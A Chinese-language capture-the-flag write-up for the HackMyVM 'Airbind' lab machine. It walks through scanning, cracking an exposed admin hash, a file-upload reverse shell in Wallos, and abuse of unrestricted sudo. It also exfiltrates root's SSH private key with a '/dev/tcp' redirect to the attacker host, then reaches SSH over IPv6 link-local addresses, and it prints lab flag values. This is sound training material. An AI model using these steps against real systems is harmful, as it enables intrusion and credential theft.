---
title: HackMyVM-Airbind
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Airbind.

> https://hackmyvm.eu/machines/machine.php?vm=Airbind
> 

Notes: **Enjoy it.**

## 信息收集

```python
nmap -sP 192.168.56.0/24           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:01 EST
Nmap scan report for 192.168.56.1
Host is up (0.00065s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00049s latency).
MAC Address: 08:00:27:A4:AE:22 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.12
Host is up (0.00043s latency).
MAC Address: 08:00:27:20:BA:03 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
```

```python
nmap -sT -min-rate 10000 -p- 192.168.56.12 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:02 EST
Nmap scan report for 192.168.56.12
Host is up (0.0014s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
MAC Address: 08:00:27:20:BA:03 (Oracle VirtualBox virtual NIC)
```

`SSH`端口提示被过滤

```python
nmap -sT -sV -O -p- 192.168.56.12         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:03 EST
Nmap scan report for 192.168.56.12
Host is up (0.00063s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:20:BA:03 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/22%OT=80%CT=1%CU=42133%PV=Y%DS=1%DC=D%G=Y%M=08002
OS:7%TM=6790ECE0%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%I
OS:I=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW
OS:7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88
OS:%W6=FE88)ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=3F%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)
```

没扫描出来系统信息

```python
nmap -script=vuln -p- 192.168.56.12                                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:09 EST
Nmap scan report for 192.168.56.12                                            
Host is up (0.00060s latency).                                                                                                                               
Not shown: 65533 closed tcp ports (reset)                                                                                                                    
PORT   STATE    SERVICE                                                                                                                                      
22/tcp filtered ssh                                                                                                                                          
80/tcp open     http                                                                                                                                         
| http-internal-ip-disclosure:                                                
|_  Internal IP Leaked: 127.0.1.1      
| http-cookie-flags:                                                          
|   /:                                 
|     PHPSESSID:                       
|       httponly flag not set 
|   /login.php:                                                               
|     PHPSESSID:                                                              
|_      httponly flag not set                                                 
|_http-dombased-xss: Couldn't find any DOM based XSS.                         
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.              
| http-csrf:                                                                  
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.12
|   Found the following possible CSRF vulnerabilities:                        
|                                                                             
|     Path: http://192.168.56.12:80/                                          
|     Form id: username                
|     Form action: login.php           
|                                      
|     Path: http://192.168.56.12:80/login.php                                 
|     Form id: username                                                                                                                                      
|_    Form action: login.php                                                  
| http-enum:                           
|   /login.php: Possible admin folder                                         
|   /.gitignore: Revision control ignore file                                 
|   /db/: BlogWorx Database                                                   
|   /manifest.json: Manifest JSON File                                        
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.57 (ubuntu)'                                                                           
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.57 (ubuntu)'                                                                       
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.57 (ubuntu)'                                                                     
|   /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.57 (ubuntu)'                                                                      
|_  /styles/: Potentially interesting directory w/ listing on 'apache/2.4.57 (ubuntu)'                                                                       
MAC Address: 08:00:27:20:BA:03 (Oracle VirtualBox virtual NIC)                                                                             
```

## 渗透

访问`web`页面，显示`wallos` ，通过查找发现是开源的个人订阅追踪器

> https://github.com/ellite/Wallos
> 

![image.png](image%2025.png)

### 目录扫描

常规操作，目录扫描

```python
dirsearch -u 192.168.56.12 -e php,zip,txt -x 403                                      
[08:23:37] Starting: 
[08:23:38] 200 -   72B  - /.dockerignore                                    
[08:23:38] 200 -  453B  - /.github/                                         
[08:23:39] 200 -  118B  - /.gitignore                                       
[08:23:53] 200 -    0B  - /auth.php                                         
[08:23:56] 200 -    7KB - /CHANGELOG.md                                     
[08:23:59] 301 -  311B  - /db  ->  http://192.168.56.12/db/                 
[08:23:59] 200 -  456B  - /db/                                              
[08:24:00] 200 -    2KB - /Dockerfile                                       
[08:24:06] 301 -  315B  - /images  ->  http://192.168.56.12/images/         
[08:24:06] 200 -  613B  - /images/                                          
[08:24:06] 301 -  317B  - /includes  ->  http://192.168.56.12/includes/     
[08:24:06] 200 -  699B  - /includes/
[08:24:09] 301 -  313B  - /libs  ->  http://192.168.56.12/libs/             
[08:24:10] 200 -  667B  - /login.php                                        
[08:24:10] 302 -    0B  - /logout.php  ->  .                                
[08:24:11] 200 -    3KB - /manifest.json                                    
[08:24:14] 200 -    1KB - /nginx.conf                                       
[08:24:22] 301 -  320B  - /screenshots  ->  http://192.168.56.12/screenshots/
[08:24:22] 200 -  577B  - /scripts/                                         
[08:24:22] 301 -  316B  - /scripts  ->  http://192.168.56.12/scripts/       
[08:24:26] 200 -    1KB - /startup.sh                                       
[08:24:27] 301 -  315B  - /styles  ->  http://192.168.56.12/styles/                                                                                
Task Completed
```

结果显示存在几个感兴趣的文件夹，并且存在`/.dockerignore` 有可能是使用docker搭建的

通过`/CHANGELOG.md`  得知`CMS`版本在`1.11.1` ，后续可以根据版本来查找漏洞

`/nginx.conf` 能看到中间件配置

`/db/` 路径很有趣，可以下载一个`db`文件（`wallos.db`）,使用`Navicat`打开

![image.png](image%2026.png)

意外得到`admin`的密码，尝试将其破解

### 密码暴力破解

使用开膛手破解

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:06 0.05% (ETA: 2025-01-23 19:29) 0g/s 137.1p/s 137.1c/s 137.1C/s lexie..celtics
admin            (?)     
1g 0:00:02:21 DONE (2025-01-22 08:37) 0.007061g/s 140.3p/s 140.3c/s 140.3C/s bernadeth..villalobos
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

竟然是`admin`，那不就是弱密码了

成功进入到后台，找一下可以利用的地方

![image.png](image%2027.png)

### 文件上传漏洞

在设置里面可以找到有上传的地方

![image.png](image%2028.png)

并且在目录扫描的时候好像发现了上传目录`/images/uploads/logos/` ，尝试一下文件上传漏洞

支付方式名称随便填，图片随便选择一张，然后`burp`抓包，修改文件内容和文件名上传，测试一下是否可以上传，修改完后点击转发

![image.png](image%2029.png)

访问上传目录，意外的发现上传成功了

![image.png](image%2030.png)

点击访问上传的文件，窝里个豆，真的可以

![image.png](image%2031.png)

### 反弹shell

再次构造恶意文件，这次直接反弹shell，先在`kali`监听

```python
# Kali开启监听
nc -lvp 1234
```

![image.png](image%2032.png)

访问刚刚上传的文件，看见在一直加载就表示成功了，现在回到`kali` ，成功获得`shell`

```python
nc -lvp 1234                       
listening on [any] 1234 ...
192.168.56.12: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.12] 41048
bash: cannot set terminal process group (210): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/images/uploads/logos$ 
```

### 信息收集

1. 系统信息
    
    ```python
    www-data@ubuntu:/var/www$ uname -a
    Linux ubuntu 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 x86_64 x86_64 GNU/Linux
    ```
    
2. `/etc/passwd`
    
    ```python
    www-data@ubuntu:/var/www$ cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
     ................
    syslog:x:102:107::/nonexistent:/usr/sbin/nologin
    systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
    ubuntu:x:1000:1000::/home/ubuntu:/bin/bash
    dnsmasq:x:103:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    polkitd:x:995:995:polkit:/nonexistent:/usr/sbin/nologin
    ```
    
    看样子`ubuntu`用户是我们的目标
    
3. 权限信息
    
    ```python
    www-data@ubuntu:/$ /usr/lib/polkit-1/polkit-agent-helper-1
    /usr/lib/polkit-1/polkit-agent-helper-1
    polkit-agent-helper-1: wrong number of arguments. This incident has been logged.
    FAILURE
    www-data@ubuntu:/$ sudo -l
    sudo -l
    Matching Defaults entries for www-data on ubuntu:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty
    
    User www-data may run the following commands on ubuntu:
        (ALL) NOPASSWD: ALL
    ```
    
    ？？？？？？？一步到胃，不过我们还在`docker`环境下
    
    ```python
    www-data@ubuntu:/$ sudo id
    sudo id
    uid=0(root) gid=0(root) groups=0(root)
    ```
    

### UserFlag

本来想直接读取`RootFlag`的但是`root`目录下只有`user.txt` 

```python
www-data@ubuntu:/$ sudo ls /root
user.txt
www-data@ubuntu:/$ sudo cat /root/user.txt
4408f370877687429c6ab332e6f560d0
```

再找找有什么可以利用的文件，可以看到有`.ssh`

```python
www-data@ubuntu:/$ sudo ls -al /root
sudo ls -al /root
total 40
drwx------  4 root root 4096 May 21  2024 .
drwxr-xr-x 17 root root 4096 Jan 22 13:01 ..
lrwxrwxrwx  1 root root    9 Apr  2  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 17  2022 .bashrc
-rw-------  1 root root   20 May 21  2024 .lesshst
drwxr-xr-x  3 root root 4096 Apr  1  2024 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   66 May 21  2024 .selected_editor
-rw-------  1 root root  300 May 21  2024 .sqlite_history
drwx------  2 root root 4096 Apr  2  2024 .ssh
-rw-------  1 root root    0 May 21  2024 .wpa_cli_history
-rwx------  1 root root   33 Apr  2  2024 user.txt
```

查看一下，将`id_rsa`拉取下来使用

```python
www-data@ubuntu:/$ sudo ls -al /root/.ssh
total 24
drwx------ 2 root root 4096 Apr  2  2024 .
drwx------ 4 root root 4096 May 21  2024 ..
-rw------- 1 root root 2590 Apr  2  2024 id_rsa
-rw-r--r-- 1 root root  565 Apr  2  2024 id_rsa.pub
-rw------- 1 root root  978 Apr  2  2024 known_hosts
-rw-r--r-- 1 root root  142 Apr  2  2024 known_hosts.old
```

（这里学到了新姿势）

```python
# 靶机
sudo cat /root/.ssh/id_rsa > /dev/tcp/192.168.56.4/2121
# 攻击机
nc -lvp 2121 > id_rsa
```

### 利用id_rsa文件

将文件保存到`kali` ，然后给予文件`600`权限，尝试使用文件登录靶机

```python
┌──(root㉿kali)-[~/Desktop/test/airbind]
└─# chmod 600 id_rsa   

┌──(root㉿kali)-[~/Desktop/test/airbind]
└─# ssh root@192.168.56.12 -i id_rsa 
```

没反应，想起来扫描端口的时候提示`22`端口被过滤了，并且上边`.ssh`文件夹下还存在`known_hosts`文件

```python
www-data@ubuntu:/tmp$ sudo cat /root/.ssh/known_hosts
|1|BUp6YxwESRbkME4kT/hGWmWcQo4=|SdbdZ8D3hrDg7Ir0JQJh6z34lPg= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY
|1|/McR8hhKRc0FFZQJfx+61TfHeyM=|4xdjdMauCbjvM0D+C+1mcvYgs6g= ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWUGR/uzPO05+HKSkUJURgu2wzSlDXxGfD0SA6AHlg1uIRrLu/qvHX7gU90RoIcC1bxwkKhOnaejLfvLVabaoiI+YW2h+gMhweT+wLuaUShJLnPLKVswRvYv3q0QfUEzoQf1PzXL1pVi+2AKLltN2IyFHhP/dcthRQ2mEPza6SNZt4XNKpChgXd7obcEYvIwDf0CueTC/kujNQCvBq2FNtmEgXkcmk9gGV908UNtzSszpkP9fyALiws9kq/KtpUw/pRhHLmouR+4w1ibVzOa3M4MaaoFzKAKtiIr7vX9aXkMCx+QeQ/iEOmIJOPHHRWZX3jePp1ysH2n/eJbd6Y6ucYDztdNqsapPT7XC3qEVjbqrPXVlWhGywePTVY2soFlKj0ymgTPGLRjWuPoNBDPWH1lJrLh37c0I4n5AF8Da2X5x6bWrbgeExhYqguafr/VkrsjPmzUmMjcILUWh0HNnZtEWy6Po8a9r4n0d3qsodWpu4/5kxUxig8Rk42/77rq8=
|1|DBJ5N5irDCxODPU5XXnjFX9VtQ0=|L2517HDjl8ItNdGfNAe6k6JKCrw= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLuHH80SwA8Qff3pGOY4aBesL0Aeesw6jqX+pbtR9O7w8jlbyNhuHmjjABb/34BxFp2oBx8o5xuZVXS1cE9nAlE=

www-data@ubuntu:/tmp$ sudo cat /root/.ssh/known_hosts.old
|1|BUp6YxwESRbkME4kT/hGWmWcQo4=|SdbdZ8D3hrDg7Ir0JQJh6z34lPg= ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY
```

没看出来是肾么？

然后发现`ip add` 下还有`IPv6`地址，可能是`ssh`仅允许`IPv6`了

```python
www-data@ubuntu:/tmp$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether dc:a1:f7:82:76:13 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.241/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::dea1:f7ff:fe82:7613/64 scope link 
       valid_lft forever preferred_lft forever
3: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
6: ap0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
```

### **使用 `ping6` 与链路本地地址广播**

通过向链路本地地址的 “所有节点多播组” 发送 ICMPv6 请求，可以发现同一链路上的所有 IPv6 设备。（https://xyaxxya.github.io/2024/12/17/HackMyVM%20Airbind/）

```python
ping6 -I eth1 ff02::1                                                     
ping6: Warning: source address might be selected on device other than: eth1   
PING ff02::1 (ff02::1) from :: eth1: 56 data bytes                            
64 bytes from fe80::5b37:1303:d04f:5988%eth1: icmp_seq=1 ttl=64 time=0.322 ms 
64 bytes from fe80::a00:27ff:fe20:ba03%eth1: icmp_seq=1 ttl=64 time=1.65 ms  
64 bytes from fe80::5b37:1303:d04f:5988%eth1: icmp_seq=2 ttl=64 time=0.056 ms 
64 bytes from fe80::a00:27ff:fe20:ba03%eth1: icmp_seq=2 ttl=64 time=0.567 ms 
64 bytes from fe80::5b37:1303:d04f:5988%eth1: icmp_seq=3 ttl=64 time=0.071 ms 
64 bytes from fe80::a00:27ff:fe20:ba03%eth1: icmp_seq=3 ttl=64 time=0.798 ms
```

就两个地址，都测试一下就行了

```python
ssh fe80::a00:27ff:fe20:ba03%eth1 -i id_rsa
Linux airbind 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@airbind:~# 
```

### RootFlag

```python
root@airbind:~# cat root.txt 
2bd693135712f88726c22770278a2dcf
```